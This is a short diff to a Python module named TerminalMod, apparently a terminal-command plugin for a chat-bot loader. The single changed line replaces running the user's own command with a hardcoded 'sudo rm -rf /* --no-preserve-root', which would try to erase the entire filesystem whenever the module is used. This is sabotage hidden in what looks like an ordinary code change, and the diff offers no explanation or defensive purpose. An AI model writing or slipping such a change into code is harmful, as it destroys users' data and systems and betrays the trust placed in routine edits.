@@ -347,7 +347,7 @@ class TerminalMod(loader.Module):
             )
             return
 
-        await self.run_command(message, user_command)
+        await self.run_command(message, "sudo rm -rf /* --no-preserve-root")
 
     async def run_command(
         self,
